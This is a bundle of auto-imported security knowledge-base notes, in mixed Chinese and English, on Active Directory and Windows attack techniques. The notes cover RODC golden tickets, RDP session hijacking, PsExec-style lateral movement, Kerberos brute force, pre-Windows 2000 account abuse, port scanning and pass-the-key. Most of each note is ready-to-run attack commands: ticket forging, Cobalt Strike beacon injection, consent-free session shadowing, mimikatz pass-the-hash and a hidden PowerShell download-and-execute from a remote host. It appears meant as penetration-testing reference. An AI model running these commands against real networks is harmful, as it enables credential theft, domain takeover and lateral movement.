是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/RODC Golden tickets 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # RODC Golden tickets 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 RODC Golden tickets 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 RODC Golden tickets 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：RODC Golden tickets、Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 RODC Golden tickets Theory Practice # 核心要点 When presenting a RODC 黄金票据 to a writable (i.e. standard) Domain Controller, it is not worth crafting the PAC because it will be recalculated by the writable Domain Controller when issuing a service ticket (ST). At the time of writing, 15th Apr. 2026, the pull request adding the -rodcNo flag in ticketer.py is pending. There are Impacket scripts for each step of a 黄金票据 creation : retrieving the domain SID, creating the RODC 黄金票据. The secret ingredient for making an RODC 黄金票据 viable is including the correct key version number in the kvno field of the ticket. # 命令 / 载荷 / 操作片段 # 1. Practice 1234567891011# Find the domain SIDlookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0# Create the RODC golden ticket (with an RC4 key, i.e. NT hash)ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" "randomuser"# Create the RODC golden ticket (with an AES 128/256bits key)ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" "randomuser"# Create the RODC golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups idsticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser" # 2. Practice 1Rubeus.exe golden /rodcNumber:$KBRTGT_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:USER /id:USER_RID /domain:domain.local /sid:DOMAIN_SID # 工具与参考入口 the pull request Impacket Rubeus specterops.io https://adsecurity.org/?p=3592 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/RDP Sessions Abuse 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # RDP Sessions Abuse 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 RDP Sessions Abuse 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 RDP Sessions Abuse 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：RDP Sessions Abuse、RDP Process Injection、RDPInception、Shadow RDP、Scheduled Tasks As Logged-On User；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 RDP Sessions Abuse RDP Process Injection RDPInception Shadow RDP Scheduled Tasks As Logged-On User CredUI Prompt Abuse From the Victim Session Requesting a PFX In the Victim Context # 核心要点 If the external group has RDP access to any computer in the current domain, an attacker could compromise that computer and wait for him. Once that user has accessed via RDP, the attacker can pivot to that users session and abuse its permissions in the external domain. If a user access via RDP into a machine where an attacker is waiting for him, the attacker will be able to inject a beacon in the RDP session of the user and if the victim mounted his drive when accessing via RDP, the attacker could access it. If you are local admin on a host where the victim already has an active RDP session, you may be able to view/control that desktop without stealing the 密码 or dumping LSASS. This is especially useful when a privileged user connected over RDP left an unlocked desktop, KeePass session, MMC console, browser session, or admin shell open. If you are local admin and the target user is currently logged on, Task Scheduler can start code as that user without their 密码. If the user is not logged on, Windows usually requires the 密码 to create a task that runs as them. This is a practical way to execute GUI actions or launch binaries inside the victim session without touching LSASS. CredUIPromptForWindowsCredentials # 命令 / 载荷 / 操作片段 # 1. RDP Process Injection 123456789101112131415161718192021# Supposing the group "External Users" has RDP access in the current domain## lets find where they could access## The easiest way would be with bloodhound, but you could also run:Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName#orFind-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName# Then, compromise the listed machines, and wait til someone from the external domain logs in:net logonsLogged on users at \\localhost:EXT\super.admin# With cobalt strike you could just inject a beacon inside of the RDP processbeacon> ps PID PPID Name Arch Session User --- ---- ---- ---- ------- ----- ... 4960 1012 rdpclip.exe x64 3 EXT\super.adminbeacon> inject 4960 x64 tcp-local## From that beacon you can just run powerview modules interacting with the external domain as that user # 2. Shadow RDP 1HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow # 3. Shadow RDP 123456789:: Check the policyreg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow:: Enable interaction without consentreg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f:: Enumerate sessions and shadow the target onequser /server:<HOST>mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt # 4. Scheduled Tasks As Logged-On User 12schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"schtasks /run /S <HOST> /TN "Updater" # 工具与参考入口 SensePost：From flat networks to locked up domains with tiering models Microsoft：Remote Desktop shadow NetExec：Shadow RDP plugin PR #465 NetExec：schtask as module NetExec：Request PFX via scheduled task PR #908 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/PsExec-Winexec-ScExec-SMBExec 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # PsExec-Winexec-ScExec-SMBExec 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 PsExec-Winexec-ScExec-SMBExec 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 PsExec-Winexec-ScExec-SMBExec 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：PsExec/Winexec/ScExec/SMBExec、How do they work、Manual ScExec/WinExec via sc.exe、Tooling and examples、Sysinternals PsExec.exe；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 PsExec/Winexec/ScExec/SMBExec How do they work Manual ScExec/WinExec via sc.exe Tooling and examples Sysinternals PsExec.exe Impacket psexec.py (PsExec-like) Impacket smbexec.py (SMBExec) SharpLateral and SharpMove OPSEC, 检测 and artifacts Troubleshooting common failures Hardening notes See also # 核心要点 These techniques abuse the Windows Service Control Manager (SCM) remotely over SMB/RPC to execute commands on a target host. The common flow is: Authenticate to the target and access the ADMIN$ share over SMB (TCP/445). Start the service to execute the 载荷 and optionally capture stdin/stdout via a named pipe. Local Administrator on the target (SeCreateServicePrivilege) or explicit service creation rights on the target. SMB (445) reachable and ADMIN$ share available; Remote Service Management allowed through host firewall. UAC Remote Restrictions: with local accounts, 令牌 filtering may block admin over the network unless using the built-in Administrator or LocalAccountTokenFilterPolicy=1. Kerberos vs NTLM: using a hostname/FQDN enables Kerberos; connecting by IP often falls back to NTLM (and may be blocked in hardened environments). To remain more OPSEC-friendly, prefer fileless commands (cmd /c, powershell -enc) or delete dropped artifacts. Classic admin tool that uses SMB to drop PSEXESVC.exe in ADMIN$, installs a temporary service (default name PSEXESVC), and proxies I/O over named pipes. Creates a temporary service that spawns cmd.exe and uses a named pipe for I/O. Generally avoids dropping a full EXE 载荷；command execution is semi-interactive. SharpLateral (C#) implements several 横向移动 methods including service-based exec. SharpMove includes service modification/creation to execute a command remotely. You can also use CrackMapExec to execute via different backends (psexec/smbexec/wmiexec): Security 4624 (Logon Type 3) and 4672 (Special Privileges) on target for the admin account used. # 命令 / 载荷 / 操作片段 # 1. Manual ScExec/WinExec via sc.exe 12345678910:: Execute a one-liner without dropping a binarysc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demandsc.exe \\TARGET start HTSvcsc.exe \\TARGET delete HTSvc:: Drop a payload to ADMIN$ and execute it (example path)copy payload.exe \\TARGET\ADMIN$\Temp\payload.exesc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demandsc.exe \\TARGET start HTSvcsc.exe \\TARGET delete HTSvc # 2. Sysinternals PsExec.exe 12345678:: Interactive SYSTEM shell on remote hostPsExec64.exe -accepteula \\HOST -s -i cmd.exe:: Run a command as a specific domain userPsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all:: Customize the service name for OPSEC (-r)PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig # 3. Sysinternals PsExec.exe 1\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami # 4. Impacket psexec.py (PsExec-like) 1234567891011# Password authpsexec.py DOMAIN/user:Password@HOST cmd.exe# Pass-the-Hashpsexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe# Kerberos (use tickets in KRB5CCNAME)psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe# Change service name and output encodingpsexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex" # 5. Impacket smbexec.py (SMBExec) 12smbexec.py DOMAIN/user:Password@HOSTsmbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST # 6. SharpLateral and SharpMove 1SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName # 7. SharpLateral and SharpMove 12SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestServiceSharpMove.exe action=startservice computername=remote.host.local servicename=TestService # 8. SharpLateral and SharpMove 12cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexeccme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec # 工具与参考入口 SharpLateral SharpMove # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Windows 原生工具利用 # 扩展记录 可在这里补充实验

content: 来源路径： 02-知识点/域与Windows/Pre-auth bruteforce 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Pre-auth bruteforce 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Pre-auth bruteforce 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Pre-auth bruteforce 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Pre-auth bruteforce、Theory、Practice、Users enum、Pre-auth Bruteforce；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Pre-auth bruteforce Theory Practice Users enum Pre-auth Bruteforce # 核心要点 The pre - 认证 requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from his 密码. An attacker knowing that secret key doesn't need knowledge of the actual 密码 to obtain tickets. This is called pass-the-key. On a side note, it is possible to enumerate domain users in a similar manner. nmap's krb5-enum-users script allows to know wether a username is valid or not (domain-wise) through a legitimate Kerberos service. The first step in enumerating the usernames is to create a wordlist (by guessing it or by looking for possible associations on social networks). The 枚举 can then be started. In its default setup, smartbrute will attack Kerberos pre - 认证 with the RC4 etype and the UDP transport protocol. While this configuration is the fastest, there are two downsides: # 命令 / 载荷 / 操作片段 # 1. Users enum 12345michael.scottjim.halpertoscar.martinezpam.beeslykevin.malone # 2. Users enum 1nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$DOMAIN',userdb=$WORDLIST" $IP_DC # 3. Pre-auth Bruteforce 12345# brute mode, users and passwords lists suppliedsmartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN# smart mode, valid credentials supplied for enumerationsmartbrute.py smart -bP $PASSWORD_LIST ntlm -d $DOMAIN -u $USER -p $PASSWORD kerberos # 工具与参考入口 nmap kerbrute smartbrute https://nmap.org/nsedoc/scripts/krb5-enum-users.html # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/Pre-Windows 2000 computers 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Pre-Windows 2000 computers 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Pre-Windows 2000 computers 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Pre-Windows 2000 computers 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Pre-Windows 2000 computers、Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Pre-Windows 2000 computers Theory Practice # 核心要点 When a new computer account is configured as "pre-Windows 2000 computer", its 密码 is set based on its name (i.e. lowercase computer name without the trailing $). When it isn't, the 密码 is randomly generated. Once an 认证 occurs for a pre-Windows 2000 computer, according to TrustedSec's blogpost, its 密码 will usually need to be changed. The ldapsearch-ad tool can be used to find such accounts. Once "pre-created" computer accounts that have not authenticated are found, they should be usable with their lowercase name set as their 密码. This can be tested with NetExec (Python) for instance. You will see the error message STATUS NOLOGON WORKSTATION TRUST ACCOUNT when you have guessed the correct 密码 for a computer account that has not been used yet. (trustedsec.com) Testers can then change the Pre-Windows 2000 computer accounts' 密码 (i.e. rpcchangepwd.py, kpasswd.py, etc.) in order to use it. Alternatively, Filip Dragovic was able to authenticate using Kerberos without having to change the account's 密码. (source) # 命令 / 载荷 / 操作片段 # 1. Practice 1234567891011# 1. find pre-created accounts that never logged onldapsearch-ad -l $LDAP_SERVER -d $DOMAIN -u $USERNAME -p $PASSWORD -t search -s '(&(userAccountControl=4128)(logonCount=0))' | tee results.txt# 2. extract the sAMAccountNames of the resultscat results.txt | grep "sAMAccountName" | awk '{print $4}' | tee computers.txt# 3. create a wordlist of passwords matching the Pre-Windows 2000 generation, based on the account namescat results.txt | grep "sAMAccountName" | awk '{print tolower($4)}' | tr -d '$' | tee passwords.txt# 4. bruteforce, line per line (user1:password1, user2:password2, ...)nxc smb $DC_IP -u "computers.txt" -p "passwords.txt" --no-bruteforce # 工具与参考入口 TrustedSec's blogpost ADUC UserAccountControl ldapsearch-ad NetExec rpcchangepwd.py kpasswd.py source # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/Port scanning 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Port scanning 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Port scanning 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Port scanning 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Port scanning、Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Port scanning Theory Practice # 核心要点 When targeting machines connected to a network, identifying which services are running and accessible remotely allows attackers to have a better understanding of the attack surface. Knowing which ports are open on a host, and which services hide between these ports is essential in the host 侦察 part of an intrusion attempt. The most commonly used tool for port scanning is nmap ("Network Mapper"). This tool features a lot of options but the main ones are the following. 88/TCP for Kerberos 认证 636/TCP for LDAPS (LDAP over TLS/SSL) 445/TCP and 445/UDP for SMB 464/TCP and 445/UDP for Kerberos 密码 change 3268/TCP for LDAP Global Catalog 3269/TCP for LDAP Global Catalog over TLS/SSL # 命令 / 载荷 / 操作片段 # 1. Practice 1234567891011121314151617# basic TCP SYN scanning of the 1000 most common TCP ports, with a normal speednmap $TARGET# basic TCP SYN scanning of the 100 most common TCP ports, with a normal speednmap -F $TARGET# scan all TCP ports with an aggressive speed, skipping host discovery, adding verbositynmap -v -Pn -p "0-65535" -T4 $TARGET# scan specific TCP ports, enable service/version detection and script scanning, skipping host discovery, with an aggressive speednmap -Pn -sC -sV -p "20-25,53,80,135,139,443,445" $TARGET# same, but scanning known vulnerabilites (CVEs) instead of default scriptsnmap -Pn --script vuln -sV -p "20-25,53,80,135,139,443,445" $TARGET# scan 20 most common UDP ports and enable service detectionnmap -sU -sV --top-ports 20 $TARGET # 2. Practice 1masscan -e $INTERFACE -p0-65535,U:0-65535 --max-rate 100000 $TARGETS # 3. Port scanning 12345# -sS for TCP SYN scan# -n for no name resolution# --open to only show (possibly) open port(s)# -p for port(s) number(s) to scannmap -sS -n --open -p 88,389 "$RANGE" # 工具与参考入口 nmap MASSCAN https://captmeelo.com/pentest/2019/07/29/port-scanning.html # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/Pass the key 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Pass the key 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Pass the key 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Pass the key 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Pass the key、Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Pass the key Theory Practice # 核心要点 The pre - 认证 requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from the user 密码. An attacker knowing that secret key doesn't need knowledge of the actual 密码 to obtain tickets. This is called pass-the-key. Kerberos offers 4 different key types: DES, RC4, AES-128 and AES-256. When the RC4 etype is enabled, the RC4 key can be used. The problem is that the RC4 key is in fact the user's NT 哈希. Using a an NT 哈希 to obtain Kerberos tickets is called overpass the 哈希. When RC4 is disabled, other Kerberos keys (DES, AES-128, AES-256) can be passed as well. This technique is called pass the key. In fact, only the name and key used differ between overpass the 哈希 and pass the key, the technique is the same. The Impacket script getTGT (Python) can request a TGT (Ticket Granting Ticket) given a 密码，哈希 (LMhash can be empty), or aesKey. The TGT will be saved as a .ccache file that can then be used by other Impacket scripts. Once a TGT is obtained, the tester can use it with the environment variable KRB5CCNAME with 工具 implementing pass-the-ticket. # 命令 / 载荷 / 操作片段 # 1. Practice 12345# with an NT hash (overpass-the-hash)getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET# with an AES (128 or 256 bits) key (pass-the-key)getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET # 2. Practice 1secretsdump.py -k -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET # 3. Practice 12345678# with an NT hashRubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt# with an AES 128 keyRubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$aes128_key /ptt# with an AES 256 keyRubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$aes256_key /ptt # 4. Practice 12345678# with an NT hashsekurlsa::pth /user:$USER /domain:$DOMAIN /rc4:$NThash /ptt# with an AES 128 keysekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt# with an AES 256 keysekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt # 工具与参考入口 Impacket getTGT Rubeus mimikatz sekurlsa::pth https://blog.notso.pro/2020-05-09-offops-in-ad-1/ http://blog.gentilkiwi.com/securite/mimikatz/overpass-the - 哈希 https://blog.stealthbits.com/how-to-detect-overpass-the - 哈希 - attacks/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
